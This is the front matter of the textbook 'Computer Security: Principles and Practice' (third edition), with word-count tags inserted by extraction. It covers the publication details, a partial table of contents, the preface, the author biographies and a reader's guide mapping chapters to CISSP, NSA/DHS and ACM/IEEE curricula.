Computer Security
Principles and Practice
[Word Count: 5]

Lawrie Brown
UNSW Canberra at the Australian Defence Force Academy
[Word Count: 10]

Boston  Columbus  Indianapolis  New York  San Francisco  Upper Saddle River
Amsterdam  Cape Town  Dubai  London  Madrid  Milan  Munich  Paris  Montreal  Toronto
[Word Count: 21]

Delhi  Mexico City  São Paulo  Sydney  Hong Kong  Seoul  Singapore  Taipei  Tokyo
[Word Count: 12]

Library of Congress Cataloging-in-Publication Data
Stallings, William, author.
  Computer security : principles and practice / William Stallings, Lawrie Brown, University of New South Wales, 
Australian Defence Force Academy. — Third edition.
    pages cm
  ISBN 978-0-13-377392-7 — ISBN 0-13-377392-2
    1.  Computer security.  2.  Computer security—Examinations—Study guides.  3.  Computer networks—Security  
measures—Examinations—Study guides.  4.  Electronic data processing personnel—Certification—Study guides.   
I.  Brown, Lawrie, author.  II.  Title. 
QA76.9.A25S685 2014
005.8—dc23
[Word Count: 65]

ISBN-10: 0-13-377392-2
ISBN-13: 978-0-13-377392-7
[Word Count: 4]

Editorial Director, ECS: Marcia Horton
Executive Editor: Tracy Johnson (Dunkelberger)
Editorial Assistant: Kelsey Loanes
Director of Marketing: Christy Lesko
Marketing Manager: Yez Alayan
Marketing Assistant: Jon Bryant
Director of Program Management: Erin Gregg
Program Management – Team Lead: Scott Disanno
Program Manager: Carole Snyder
Project Manager: Robert Engelhardt
Procurement Specialist: Linda Sager
[Word Count: 52]

Cover Designer: Marta Samsel
Managing Project Editor: Dr. Priyadharshini 
  Dhanagopal
Production Project Manager: Jennifer Sargunar
Permissions Supervisor: Rachel Youdelman
Permissions Administrator: William Opaluch
Cover Art: © Arnaud Chicurel/Hemis/Corbis
Associate Web Developer: Barry Offringa
Full-Service Project Management: 
  Mahalatchoumy Saravanan, Jouve India
[Word Count: 40]

Credits and acknowledgments borrowed from other sources and reproduced, with permission, in this textbook 
appear on page 815.
[Word Count: 18]

Copyright © 2015, 2012, 2008 by Pearson Education, Inc. All rights reserved. Printed in the United States of 
America. This publication is protected by copyright, and permission should be obtained from the publisher 
prior to any prohibited reproduction, storage in a retrieval system, or transmission in any form or by any means, 
electronic, mechanical, photocopying, recording, or likewise. To obtain permission(s) to use material from this 
work, please submit a written request to Pearson Education, Inc., Permissions Department, One Lake Street, 
Upper Saddle River, New Jersey 07458, or you may fax your request to 201-236-3290.
[Word Count: 95]

Many of the designations by manufacturers and sellers to distinguish their products are claimed as trademarks. 
Where those designations appear in this book, and the publisher was aware of a trademark claim, the designations 
have been printed in initial caps or all caps.
[Word Count: 43]

Part One Computer Security Technology and Principles 40
Chapter 2	 Cryptographic Tools 40
	
2.1	
Confidentiality with Symmetric Encryption 41
	
2.2	
Message Authentication and Hash Functions 47
	
2.3	
Public-Key Encryption 55
	
2.4	
Digital Signatures and Key Management 60
	
2.5	
Random and Pseudorandom Numbers 64
	
2.6	
Practical Application: Encryption of Stored Data 66
	
2.7	
Recommended Reading 67
	
2.8	
Key Terms, Review Questions, and Problems 68
Chapter 3	 User Authentication 72
	
3.1	
Electronic User Authentication Principles 74
	
3.2	
Password-Based Authentication 78
	
3.3	
Token-Based Authentication 90
	
3.4	
Biometric Authentication 96
	
3.5	
Remote User Authentication 100
[Word Count: 91]

Chapter 7	 Denial-of-Service Attacks 240
	
7.1	
Denial-of-Service Attacks 241
	
7.2	
Flooding Attacks 248
	
7.3	
Distributed Denial-of-Service Attacks 250
	
7.4	
Application-Based Bandwidth Attacks 252
	
7.5	
Reflector and Amplifier Attacks 254
	
7.6	
Defenses Against Denial-of-Service Attacks 259
	
7.7	
Responding to a Denial-of-Service Attack 263
	
7.8	
Recommended Reading 264
	
7.9	
Key Terms, Review Questions, and Problems 264
[Word Count: 54]

Part Two Software Security and Trusted Systems 336
Chapter 10	 Buffer Overflow 336
	
10.1	
Stack Overflows 338
	
10.2	
Defending Against Buffer Overflows 359
	
10.3	
Other Forms of Overflow Attacks 365
	
10.4	
Recommended Reading 372
	
10.5	
Key Terms, Review Questions, and Problems 372
Chapter 11	 Software Security 375
	
11.1	
Software Security Issues 376
	
11.2	
Handling Program Input 380
[Word Count: 57]

Chapter 16	 Physical and Infrastructure Security 534
	
16.1	
Overview 535
	
16.2	
Physical Security Threats 536
	
16.3	
Physical Security Prevention and Mitigation Measures 543
	
16.4	
Recovery From Physical Security Breaches 546
	
16.5	
Example: A Corporate Physical Security Policy 546
	
16.6	
Integration of Physical and Logical Security 547
	
16.7	
Recommended Reading 553
	
16.8	
Key Terms, Review Questions, and Problems 554
[Word Count: 58]

Chapter 17	 Human Resources Security 556
[Word Count: 6]

17.1	
Security Awareness, Training, and Education 557
	
17.2	
Employment Practices and Policies 563
	
17.3	
E-Mail and Internet Use Policies 566
	
17.4	
Computer Security Incident Response Teams 567
	
17.5	
Recommended Reading 574
	
17.6	
Key Terms, Review Questions, and Problems 575
[Word Count: 39]

Chapter 18	 Security Auditing 577
	
18.1	
Security Auditing Architecture 579
	
18.2	
Security Audit Trail 584
	
18.3	
Implementing the Logging Function 588
	
18.4	
Audit Trail Analysis 600
	
18.5	
Example: An Integrated Approach 604
	
18.6	
Recommended Reading 607
	
18.7	
Key Terms, Review Questions, and Problems 608
[Word Count: 44]

Chapter 19	 Legal and Ethical Aspects 610
	
19.1	
Cybercrime and Computer Crime 611
	
19.2	
Intellectual Property 615
	
19.3	
Privacy 621
	
19.4	
Ethical Issues 626
	
19.5	
Recommended Reading 633
	
19.6	
Key Terms, Review Questions, and Problems 634
[Word Count: 36]

Part Four Cryptographic Algorithms 637
Chapter 20	 Symmetric Encryption and Message Confidentiality 637
	
20.1	
Symmetric Encryption Principles 638
	
20.2	
Data Encryption Standard 643
	
20.3	
Advanced Encryption Standard 645
	
20.4	
Stream Ciphers and RC4 651
	
20.5	
Cipher Block Modes of Operation 655
	
20.6	
Location of Symmetric Encryption Devices 660
	
20.7	
Key Distribution 662
	
20.8	
Recommended Reading 664
	
20.9	
Key Terms, Review Questions, and Problems 664
[Word Count: 64]

Chapter 21	 Public-Key Cryptography and Message Authentication 669
	
21.1	
Secure Hash Functions 670
	
21.2	
HMAC 675
	
21.3	
The RSA Public-Key Encryption Algorithm 679
	
21.4	
Diffie-Hellman and Other Asymmetric Algorithms 684
	
21.5	
Recommended Reading 689
	
21.6	
Key Terms, Review Questions, and Problems 689
[Word Count: 42]

Part Five Network Security 693
Chapter 22	 Internet Security Protocols and Standards 693
[Word Count: 13]

1Online chapters, appendices, and other documents are Premium Content, available via the access card at 
the front of this book.
[Word Count: 20]

Since the second edition of this book was published, the field has seen continued innovations 
and improvements. In this new edition, we try to capture these changes while maintaining a 
broad and comprehensive coverage of the entire field. To begin the process of revision, the 
second edition of this book was extensively reviewed by a number of professors who teach 
the subject and by professionals working in the field. The result is that in many places the 
narrative has been clarified and tightened, and illustrations have been improved.
[Word Count: 88]

Beyond these refinements to improve pedagogy and user-friendliness, there have 
been major substantive changes throughout the book. The most noteworthy changes are as 
follows:
[Word Count: 24]

• Fundamental security design principles: Chapter 1 includes a new section discussing the
[Word Count: 13]

security design principles listed as fundamental by the National Centers of Academic 
Excellence in Information Assurance/Cyber Defense, which is jointly sponsored by the 
U.S. National Security Agency and the U.S. Department of Homeland Security.
 
• Attack surfaces and attack trees: Chapter 1 includes a new section describing these two
[Word Count: 49]

concepts, which are useful in evaluating and classifying security threats.
 
• User authentication model: Chapter 3 includes a new description of a general model
[Word Count: 24]

for user authentication, which helps to unify the discussion of the various approaches 
to user authentication.
 
• Attribute-based access control (ABAC): Chapter 4 has a new section devoted to
[Word Count: 29]

ABAC, which is becoming increasingly widespread.
 
• Identity, credential, and access management (ICAM): Chapter 4 includes a new sec-
[Word Count: 19]

tion on ICAM, which is a comprehensive approach to managing and implementing 
digital identities (and associated attributes), credentials, and access control.
 
• Trust frameworks: Chapter 4 includes a new section on the Open Identity Trust
[Word Count: 35]

Framework, which is an open, standardized approach to trustworthy identity and attri-
bute exchange that is becoming increasingly widespread.
 
• SQL injection attacks: Chapter 5 includes a new section on the SQL injection attack,
[Word Count: 34]

which is one of the most prevalent and dangerous network-based security threats.
 
• Cloud security: The material on cloud security in Chapter 5 has been updated and
[Word Count: 27]

expanded to reflect its importance and recent developments.
 
• Malware: The material on Malware, and on categories of intruders, has been revised to
[Word Count: 23]

reflect the latest developments, including details of Advanced Persistent Threats, which 
are most likely due to nation state actors.
 
• Intrusion detection/intrusion prevention systems: The material on IDS/IPS has been
[Word Count: 30]

updated to reflect new developments in the field, including the latest developments in 
Host-Based Intrusion Detection Systems that assist in implementing a defense-in-depth 
strategy.
[Word Count: 24]

• Human resources: Security lapses due to human factors and social engineering are of
[Word Count: 14]

increasing concern, including several recent cases of massive data exfiltration by insid-
ers. Addressing such lapses requires a complex mix of procedural and technical con-
trols, which we review in several significantly revised sections.
 
• Mobile device security: Mobile device security has become an essential aspect of enter-
[Word Count: 48]

prise network security, especially for devices in the category known as bring your own 
device (BYOD). A new section in Chapter 24 covers this important topic.
 
• SHA-3: This recently adopted cryptographic hash standard is covered in a new
[Word Count: 39]

Interest in education in computer security and related topics has been growing at a dramatic rate 
in recent years. This interest has been spurred by a number of factors, two of which stand out:
[Word Count: 34]

1.	 As information systems, databases, and Internet-based distributed systems and commu-
[Word Count: 11]

nication have become pervasive in the commercial world, coupled with the increased 
intensity and sophistication of security-related attacks, organizations now recognize 
the need for a comprehensive security strategy. This strategy encompasses the use of 
specialized hardware and software and trained personnel to meet that need.
	
2.	 Computer security education, often termed information security education or informa-
[Word Count: 56]

tion assurance education, has emerged as a national goal in the United States and other 
countries, with national defense and homeland security implications. The NSA/DHS 
National Center of Academic Excellence in Information Assurance/Cyber Defense is 
spearheading a government role in the development of standards for computer secu-
rity education.
[Word Count: 49]

Accordingly, the number of courses in universities, community colleges, and other insti-
tutions in computer security and related areas is growing.
[Word Count: 21]

The objective of this book is to provide an up-to-date survey of developments in computer 
security. Central problems that confront security designers and security administrators 
include defining the threats to computer and network systems, evaluating the relative risks 
of these threats, and developing cost-effective and user friendly countermeasures.
[Word Count: 48]

The following basic themes unify the discussion:
[Word Count: 7]

• Principles: Although the scope of this book is broad, there are a number of basic prin-
[Word Count: 17]

ciples that appear repeatedly as themes and that unify this field. Examples are issues 
relating to authentication and access control. The book highlights these principles and 
examines their application in specific areas of computer security.
 
• Design approaches: The book examines alternative approaches to meeting specific
[Word Count: 46]

computer security requirements.
 
• Standards: Standards have come to assume an increasingly important, indeed domi-
[Word Count: 15]

nant, role in this field. An understanding of the current status and future direction of 
technology requires a comprehensive discussion of the related standards.
[Word Count: 24]

• Real-world examples: A number of chapters include a section that shows the practical
[Word Count: 14]

application of that chapter’s principles in a real-world environment.
[Word Count: 9]

Support of ACM/IEEE Computer Science Curricula 2013
[Word Count: 7]

See Chapter 0 for details of this book’s coverage of CS2013.
[Word Count: 11]

The CISSP examination is based on the Common Body of Knowledge (CBK), a com-
pendium of information security best practices developed and maintained by (ISC)2, a 
nonprofit organization. The CBK is made up of 10 domains that comprise the body of knowl­
edge that is required for CISSP certification. See Chapter 0 for details of this book’s coverage  
of CBK.
[Word Count: 60]

The book is divided into five parts (see Chapter 0):
[Word Count: 10]

• Computer Security Technology and Principles
 
• Software Security and Trusted Systems
 
• Management Issues
 
• Cryptographic Algorithms
 
• Network Security
[Word Count: 21]

The book is also accompanied by a number of online chapters and appendices that 
provide more detail on selected topics.
[Word Count: 20]

The book includes an extensive glossary, a list of frequently used acronyms, and a bib-
liography. Each chapter includes homework problems, review questions, a list of key words, 
and suggestions for further reading.
[Word Count: 33]

The major goal of this text is to make it as effective a teaching tool for this exciting and fast-moving 
subject as possible. This goal is reflected both in the structure of the book and in the supporting 
material. The text is accompanied by the following supplementary material to aid the instructor:
[Word Count: 52]

• Projects manual: Project resources including documents and portable software, plus sug-
[Word Count: 12]

gested project assignments for all of the project categories listed in the following section.
 
• Solutions manual: Solutions to end-of-chapter Review Questions and Problems.
 
• PowerPoint slides: A set of slides covering all chapters, suitable for use in lecturing.
 
• PDF files: Reproductions of all figures and tables from the book.
 
• Test bank: A chapter-by-chapter set of questions.
 
• Sample syllabuses: The text contains more material than can be conveniently covered
[Word Count: 72]

in one semester. Accordingly, instructors are provided with several sample syllabuses 
that guide the use of the text within limited time. These samples are based on real-
world experience by professors with the first edition.
[Word Count: 35]

All of these support materials are available at the Instructor Resource Center (IRC) for 
this textbook, which can be reached through the publisher’s Web site www.pearsonhighered 
.com/stallings or by clicking on the link labeled Pearson Resources for Instructors at this book’s 
Companion Web site at WilliamStallings.com/ComputerSecurity. To gain access to the IRC, 
please contact your local Pearson sales representative via pearsonhighered.com/educator/ 
replocator/requestSalesRep.page or call Pearson Faculty Services at 1-800-526-0485.
[Word Count: 69]

The Companion Web Site, at WilliamStallings.com/ComputerSecurity (click on the 
Instructor Resources link), includes the following:
[Word Count: 15]

• Links to Web sites for other courses being taught using this book.
 
• Sign-up information for an Internet mailing list for instructors using this book to
[Word Count: 27]

exchange information, suggestions, and questions with each other and with the author.
[Word Count: 12]

For this new edition, a tremendous amount of original supporting 
material for students has been made available online, at two Web 
locations. The Companion Web Site, at WilliamStallings.com/
ComputerSecurity (click on the Student Resources link), includes 
a list of relevant links organized by chapter and an errata sheet 
for the book.
[Word Count: 51]

Purchasing this textbook now grants the reader 12-months of 
access to the Premium Content Site, which includes the following 
materials:
[Word Count: 20]

•  Online chapters: To limit the size and cost of the book, two
[Word Count: 13]

chapters of the book are provided in PDF format. The chapters 
are listed in this book’s table of contents.
•  Online appendices: There are numerous interesting topics that
[Word Count: 28]

support material found in the text but whose inclusion is not 
warranted in the printed text. A total of nine appendices cover 
these topics for the interested student. The appendices are listed in this book’s table of 
contents.
 
• Homework problems and solutions: To aid the student in understanding the material,
[Word Count: 51]

a separate set of homework problems with solutions is available. These enable the stu-
dents to test their understanding of the text.
[Word Count: 22]

To access the Premium Content site, click on the Premium Content link at the 
Companion Web site or at pearsonhighered.com/stallings and enter the student access code 
found on the card in the front of the book.
[Word Count: 36]

For many instructors, an important component of a computer security course is a project 
or set of projects by which the student gets hands-on experience to reinforce concepts from 
the text. This book provides an unparalleled degree of support for including a projects com-
ponent in the course. The instructor’s support materials available through Pearson not only 
include guidance on how to assign and structure the projects but also include a set of user’s 
manuals for various project types plus specific assignments, all written especially for this 
book. Instructors can assign work in the following areas:
[Word Count: 96]

• Hacking exercises: Two projects that enable students to gain an understanding of the
[Word Count: 14]

issues in intrusion detection and prevention.
 
• Laboratory exercises: A series of projects that involve programming and experiment-
[Word Count: 18]

ing with concepts from the book.
 
• Security education (SEED) projects: The SEED projects are a set of hands-on exer-
[Word Count: 20]

cises, or labs, covering a wide range of security topics.
 
• Research projects: A series of research assignments that instruct the student to research
[Word Count: 24]

a particular topic on the Internet and write a report.
 
• Programming projects: A series of programming projects that cover a broad range of
[Word Count: 24]

topics and that can be implemented in any suitable language on any platform.
 
• Practical security assessments: A set of exercises to examine current infrastructure and
[Word Count: 26]

practices of an existing organization.
 
• Firewall projects: A portable network firewall visualization simulator is provided,
[Word Count: 16]

together with exercises for teaching the fundamentals of firewalls.
 
• Case studies: A set of real-world case studies, including learning objectives, case
[Word Count: 22]

description, and a series of case discussion questions.
[Word Count: 8]

• Reading/report assignments: A list of papers that can be assigned for reading and writ-
[Word Count: 15]

ing a report, plus suggested assignment wording.
 
• Writing assignments: A list of writing assignments to facilitate learning the material.
 
• Webcasts for teaching computer security: A catalog of webcast sites that can be used to
[Word Count: 36]

enhance the course. An effective way of using this catalog is to select, or allow the student 
to select, one or a few videos to watch, and then to write a report/analysis of the video.
[Word Count: 35]

This diverse set of projects and other student exercises enables the instructor to use the 
book as one component in a rich and varied learning experience and to tailor a course plan to 
meet the specific needs of the instructor and students. See Appendix A in this book for details.
[Word Count: 50]

Dr. Lawrie Brown would first like to thank Bill Stallings for the pleasure of work-
ing with him to produce this text. I would also like to thank my colleagues in the School of 
Engineering and Information Technology, UNSW Canberra at the Australian Defence Force 
Academy for their encouragement and support.
[Word Count: 51]

Finally, we would like to thank the many people responsible for the publication of the 
book, all of whom did their usual excellent job. This includes the staff at Pearson, particularly 
our editor Tracy Dunkelberger, program manager Carole Snyder, and production manager 
Bob Engelhardt. We also thank the production staff at Jouve India for another excellent and 
rapid job. Thanks also to the marketing and sales staff at Pearson, without whose efforts this 
book would not be in your hands.
[Word Count: 80]

D, K
D(K, Y )
Symmetric decryption of ciphertext Y using secret key K
[Word Count: 14]

D, PRa
D(PRa, Y )
Asymmetric decryption of ciphertext Y using A’s private key PRa
[Word Count: 15]

D, PUa
D(PUa, Y )
Asymmetric decryption of ciphertext Y using A’s public key PUa
[Word Count: 15]

E, K
E(K, X )
Symmetric encryption of plaintext X using secret key K
[Word Count: 14]

E, PRa
E(PRa, X )
Asymmetric encryption of plaintext X using A’s private key PRa
[Word Count: 15]

E, PUa
E(PUa, X )
Asymmetric encryption of plaintext X using A’s public key PUa
[Word Count: 15]

C
A characteristic formula, consisting of a logical formula over the 
values of attributes in a database
[Word Count: 17]

X
X(C )
Query set of C, the set of records satisfying C
[Word Count: 13]

, X
X(C) 
Magnitude of X(C ): the number of records in X(C )
[Word Count: 14]

¨
X(C) ¨ X(D)
Set intersection: the number of records in both X(C) and X(D)
[Word Count: 15]

He created and maintains the Computer Science Student Resource Site at Computer 
ScienceStudent.com. This site provides documents and links on a variety of subjects of 
general interest to computer science students (and professionals). He is a member of the 
editorial board of Cryptologia, a scholarly journal devoted to all aspects of cryptology. His 
articles appear regularly at http://www.networking.answers.com, where he is the Networking 
Category Expert Writer.
[Word Count: 66]

Dr. Lawrie Brown is a senior lecturer in the School of Engineering 
and Information Technology, UNSW Canberra at the Australian 
Defence Force Academy.
[Word Count: 23]

His professional interests include communications and 
computer systems security and cryptography, including research 
on client authentication using proxy certificates, trust and security 
in eCommerce and Web environments, the design of secure remote 
code execution environments using the functional language 
Erlang, and on the design and implementation of the LOKI family 
of block ciphers.
He currently teaches courses on cyber-security and data structures, and has previously 
presented courses on cryptography, data communications, and programming in Java.
[Word Count: 75]

0.2	 A Roadmap for Readers and Instructors
[Word Count: 7]

0.5	 Support for ACM/IEEE Computer Society Computer Science Curricula 2013
[Word Count: 10]

0.6	 Internet and Web Resources
Web Sites for This Book
Computer Science Student Resource Site
Other Web Sites
[Word Count: 18]

2    Chapter 0 / Reader’s and Instructor’s Guide
[Word Count: 8]

This book, with its accompanying Web site, covers a lot of material. Here we give 
the reader an overview.
[Word Count: 19]

Following an introductory chapter, Chapter 1, the book is organized into five parts:
[Word Count: 13]

A number of online appendices cover additional topics relevant to the book.
[Word Count: 12]

0.2	 A Roadmap for Readers and Instructors
[Word Count: 7]

This book covers a lot of material. For the instructor or reader who wishes a shorter 
treatment, there are a number of alternatives.
[Word Count: 23]

To thoroughly cover the material in the first two parts, the chapters should 
be read in sequence. If a shorter treatment in Part One is desired, the reader may 
choose to skip Chapter 5 (Database Security).
[Word Count: 36]

Although Part Two covers software security, it should be of interest to users 
as well as system developers. However, it is more immediately relevant to the latter 
category. Chapter 13 (Trusted Computing and Multilevel Security) may be consid-
ered optional.
[Word Count: 40]

The chapters in Part Three are relatively independent of one another, with 
the exception of Chapters 14 (IT Security Management and Risk Assessment) 
and 15 (IT Security Controls, Plans, and Procedures). The chapters can be read 
in any order and the reader or instructor may choose to select only some of the 
chapters.
[Word Count: 53]

Part Four provides technical detail on cryptographic algorithms for the inter-
ested reader.
[Word Count: 13]

Part Five covers Internet security and can be read at any point after Part One.
[Word Count: 15]

This book provides coverage of all the subject areas specified for CISSP (Certified 
Information Systems Security Professional) certification.
[Word Count: 18]

As employers have come to depend on in-house staff to manage and develop 
security policies and technologies, and to evaluate and manage outside security 
services and products, there is a need for methods for evaluating candidates. 
Increasingly, employers are turning to certification as a tool for guaranteeing that 
a potential employee has the required level of knowledge in a range of security 
areas.
[Word Count: 63]

The international standard ISO/IEC 17024 (General Requirements for Bodies 
Operating Certification of Persons) defines the following terms related to certification:
[Word Count: 20]

• Certification process: All activities by which a certification body establishes
[Word Count: 11]

that a person fulfills specified competence requirements.
 
• Certification scheme: Specific certification requirements related to specified
[Word Count: 16]

categories of persons to which the same particular standards and rules, and the 
same procedures apply.
 
• Competence: Demonstrated ability to apply knowledge and/or skills and,
[Word Count: 26]

where relevant, demonstrated personal attributes, as defined in the certifica-
tion scheme.
[Word Count: 12]

The CISSP designation from the International Information Systems Security 
Certification Consortium (ISC)2, a nonprofit organization, is often referred to as 
the “gold standard” when it comes to information security certification. It is the 
only universally recognized certification in the security industry [SAVA03]. Many 
organizations, including the U.S. Department of Defense and many financial insti-
tutions, now require that cyber security personnel have the CISSP certification 
[DENN11]. In 2004, CISSP became the first IT (Information Technology) program 
to earn accreditation under ISO/IEC 17024.
[Word Count: 82]

0.3 / Support For Cissp Certification   3
[Word Count: 7]

4    Chapter 0 / Reader’s and Instructor’s Guide
[Word Count: 8]

The CISSP examination is based on the Common Body of Knowledge (CBK), 
a compendium of information security best practices developed and maintained by 
(ISC)2. The CBK is made up of 10 domains that comprise the body of knowledge 
that is required for CISSP certification. Table 0.1 shows the support for the CISSP 
body of knowledge provided in this textbook.
[Word Count: 59]

CISSP Domain
Key Topics in Domain
Textbook Coverage
[Word Count: 8]

Access Control
• Identification, authentication, and
[Word Count: 6]

authorization technologies
• Discretionary versus mandatory access
[Word Count: 7]

control models
• Rule-based and role-based access
[Word Count: 7]

• Software development models
• Database models
• Relational database components
[Word Count: 11]

5—Database Security
10—Buffer Overflow
11—Software Security
[Word Count: 6]

Business Continuity 
and Disaster 
Recovery Planning
[Word Count: 6]

• Planning
• Roles and responsibilities
• Liability and due care issues
• Business impact analysis
[Word Count: 16]

16—Physical and Infrastructure 
Security
17—Human Resources Security
[Word Count: 7]

Cryptography
• Block and stream ciphers
• Explanation and uses of symmetric
[Word Count: 12]

algorithms
• Explanation and uses of asymmetric
[Word Count: 7]

2—Cryptographic Tools
20—Symmetric Encryption and 
Message Confidentiality
21—Public-Key Cryptography and 
Message Authentication
[Word Count: 12]

Information Security 
Governance and Risk 
Management
[Word Count: 6]

• Types of security controls
• Security policies, standards, procedures,
[Word Count: 10]

and guidelines
• Risk management and analysis
[Word Count: 7]

14—IT Security Management and 
Risk Assessment
15—IT Security Controls, Plans, and 
Procedures
[Word Count: 12]

Legal, Regulations, 
Investigations, and 
Compliance
[Word Count: 5]

• Privacy laws and concerns
• Computer crime investigation
• Types of evidence
[Word Count: 13]

Operations Security
• Operations department responsibilities
• Personnel and roles
• Media library and resource protection
[Word Count: 16]

15—IT Security Controls, Plans, and 
Procedures
17—Human Resources Security
18—Security Auditing
[Word Count: 11]

• Facility location and construction issues
• Physical vulnerabilities and threats
• Perimeter protection
[Word Count: 14]

16—Physical and Infrastructure 
Security
[Word Count: 4]

• Critical components
• Access control models
• Certification and accreditation
[Word Count: 11]

13—Trusted Computing and 
Multilevel Security
[Word Count: 5]

Telecommunications 
and Network Security
[Word Count: 4]

• TCP/IP protocol suite
• LAN, MAN, and WAN technologies
• Firewall types and architectures
[Word Count: 15]

Appendix F—TCP/IP Protocol 
Architecture
22—Internet Security Protocols and 
Standards
24—Wireless Network Security
[Word Count: 12]

0.4 / Support for Nsa/Dhs Certification   5
[Word Count: 7]

• Access control: A collection of mechanisms that work together to create a
[Word Count: 13]

security architecture to protect the assets of the information system.
 
• Application development security: Addresses the important security concepts
[Word Count: 19]

that apply to application software development. It outlines the environment 
where software is designed and developed and explains the critical role soft-
ware plays in providing information system security.
 
• Business continuity and disaster recovery planning: For the preservation and
[Word Count: 40]

recovery of business operations in the event of outages.
 
• Cryptography: The principles, means, and methods of disguising information
[Word Count: 19]

to ensure its integrity, confidentiality, and authenticity.
 
• Information security governance and risk management: The identification
[Word Count: 16]

of an organization’s information assets and the development, documenta-
tion, and implementation of policies, standards, procedures, and guidelines. 
Management tools such as data classification and risk assessment/analysis are 
used to identify threats, classify assets, and to rate system vulnerabilities so 
that effective controls can be implemented.
 
• Legal, regulations, investigations, and compliance: The types of computer
[Word Count: 56]

crime laws and regulations. The measures and technologies used to investigate 
computer crime incidents.
 
• Operations security: Used to identify the controls over hardware, media,
[Word Count: 25]

and the operators and administrators with access privileges to any of these 
resources. Audit and monitoring are the mechanisms, tools, and facilities that 
permit the identification of security events and subsequent actions to identify 
the key elements and report the pertinent information to the appropriate indi-
vidual, group, or process.
 
• Physical (environmental) security: Provides protection techniques for the
[Word Count: 59]

entire facility, from the outside perimeter to the inside office space, including 
all of the information system resources.
 
• Security architecture and design: Contains the concepts, principles, structures,
[Word Count: 28]

and standards used to design, monitor, and secure operating systems, equip-
ment, networks, applications, and those controls used to enforce various levels 
of availability, integrity, and confidentiality.
 
• Telecommunications and network security: Covers network structures; trans-
[Word Count: 36]

mission methods; transport formats; security measures used to provide avail-
ability, integrity, and confidentiality; and authentication for transmissions over 
private and public communications networks and media.
[Word Count: 26]

In this book, we cover each of these domains in some depth.
[Word Count: 12]

The U.S. National Security Agency (NSA) and the U.S. Department of Homeland 
Security (DHS) jointly sponsor the National Centers of Academic Excellence in 
Information Assurance/Cyber Defense (IA/CD). The goal of these programs is
[Word Count: 33]

6    Chapter 0 / Reader’s and Instructor’s Guide
[Word Count: 8]

In the area of computer security, the 2014 Knowledge Units document 
[NCAE13] lists the following core Knowledge Units:
[Word Count: 18]

• Cyber defense: Includes access control, cryptography, firewalls, intrusion de-
[Word Count: 10]

tection systems, malicious activity detection and countermeasures, trust rela-
tionships, and defense in depth.
 
• Cyber threats: Includes types of attacks, legal issues, attack surfaces, attack
[Word Count: 26]

trees, insider problems, and threat information sources.
 
• Fundamental security design principles: A list of 12 principles, all of which are
[Word Count: 21]

covered in Section 1.4 of this book.
 
• Information assurance fundamentals: Includes threats and vulnerabilities,
[Word Count: 15]

intrusion detection and prevention systems, cryptography, access control 
models, identification/authentication, and audit.
 
• Introduction to cryptography: Includes symmetric cryptography, public-key
[Word Count: 20]

cryptography, hash functions, and digital signatures.
 
• Databases: Includes an overview of databases, database access controls, and
[Word Count: 17]

This book provides extensive coverage in all of these areas. In addition, the 
book partially covers a number of the optional Knowledge Units.
[Word Count: 23]

0.5	 Support for ACM/Ieee Computer Society
[Word Count: 6]

Computer Science Curricula 2013 (CS2013) is a joint effort of the Association 
for Computing Machinery (ACM) and the Computer Society of the Institute of 
Electrical and Electronics Engineers (IEEE-CS). ACM and IEEE-CS have col-
laborated on developing recommended computer science curricula starting with 
the publication of Curriculum 68. CS2013 is the first comprehensive revision of the 
recommendation since 2001. Hundreds of computer science professors, department 
chairs, and directors of undergraduate studies worldwide were involved in develop-
ing CS2013. There was a wide consensus that a strong need existed to add a new 
Knowledge Area on Information Assurance and Security (IAS).
[Word Count: 100]

IAS as a domain is the set of controls and processes, both technical and policy, 
intended to protect and defend information and information systems by ensuring 
their availability, integrity, authentication, and confidentiality and providing for 
non-repudiation. The concept of assurance also carries an attestation that current
[Word Count: 46]

0.5 / Support for ACM/Ieee Computer Society   7
[Word Count: 8]

and past processes and data are valid. Both assurance and security concepts are 
needed to ensure a complete perspective.
[Word Count: 19]

CS2013 divides all course work into three categories: Core-Tier 1 (all topics 
should be included in the curriculum), Core-Tier-2 (all or almost all topics should 
be included), and Elective (desirable to provide breadth and depth). In the IAS 
area, CS2013 includes three Tier 1 topics, five Tier 2 topics, and numerous Elective 
topics, each of which has a number of subtopics. This text covers all of the Tier 1 
and Tier 2 topics and subtopics listed by CS2013, as well as many of the elective 
topics. Table 0.2 shows the support for the ISA Knowledge Area provided in this 
textbook.
[Word Count: 100]

Table 0.2  Coverage of CS2013 Information Assurance and Security (IAS) Knowledge Area
[Word Count: 12]

IAS Knowledge 
Units
Topics
Textbook Coverage
[Word Count: 6]

Foundational 
Concepts in Security 
(Tier 1)
[Word Count: 6]

Availability
• Risk, threats, vulnerabilities, and attack
[Word Count: 7]

vectors
• Authentication and authorization,
[Word Count: 5]

and access control (mandatory vs.  
discretionary)
• Trust and trustworthiness
• Ethics (responsible disclosure)
[Word Count: 14]

1—Overview
3—User Authentication
4—Access Control
19—Legal and Ethical Aspects
[Word Count: 9]

• Least privilege and isolation
• Fail-safe defaults
• Open design
• End-to-end security
• Defense in depth
• Security by design
• Tensions between security and other
[Word Count: 28]

• Complete mediation
• Use of vetted security components
• Economy of mechanism (reducing
[Word Count: 14]

trusted computing base, minimize attack 
surface)
• Usable security
• Security composability
• Prevention, detection, and deterrence
[Word Count: 17]

• Input validation and data sanitization
• Choice of programming language and
[Word Count: 12]

type-safe languages
• Examples of input validation and data
[Word Count: 9]

sanitization errors (buffer overflows, 
integer errors, SQL injection, and XSS 
vulnerability)
• Race conditions
• Correct handling of exceptions and
[Word Count: 20]

8    Chapter 0 / Reader’s and Instructor’s Guide
[Word Count: 8]

There are a number of resources available on the Internet and the Web to support 
this book and to help one keep up with developments in this field.
[Word Count: 28]

Three Web sites provide additional resources for students and instructors. We main-
tain a Companion Web site for this book at WilliamStallings.com/ComputerSecurity. 
For students, this Web site includes a list of relevant links, organized by chapter, 
and an errata sheet for the book. For instructors, this Web site provides links to 
course pages by professors teaching from this book.
[Word Count: 59]

There is also an access-controlled Premium Content Web site that provides 
a wealth of supporting material, including additional online chapters, additional 
online appendices, and a set of homework problems with solutions. See the card at 
the front of this book for access information.
[Word Count: 43]

Finally, additional material for instructors, including a solutions manual and a 
projects manual, is available at the Instructor Resource Center (IRC) for this book. 
See Preface for details and access information.
[Word Count: 31]

William Stallings also maintains the Computer Science Student Resource Site, at 
ComputerScienceStudent.com. The purpose of this site is to provide documents, 
information, and links for computer science students and professionals. Links and 
documents are organized into five categories:
[Word Count: 38]

IAS Knowledge 
Units
Topics
Textbook Coverage
[Word Count: 6]

• Correct usage of third-party components
• Effectively deploying security updates
